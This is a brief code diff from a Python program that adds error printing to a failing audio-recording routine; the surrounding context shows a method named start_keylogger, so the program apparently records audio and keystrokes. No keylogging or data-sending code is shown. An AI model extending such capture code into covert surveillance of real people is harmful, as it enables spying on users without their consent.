@@ -175,7 +175,8 @@ Timestamp: {datetime.now().isoformat()}
                 f.writeframes(recording.tobytes())
             
             return filepath
-        except Exception:
+        except Exception as e:
+            print(f"Audio recording failed: {e}")
             return None
     
     def start_keylogger(self, log_file: Optional[str] = None):
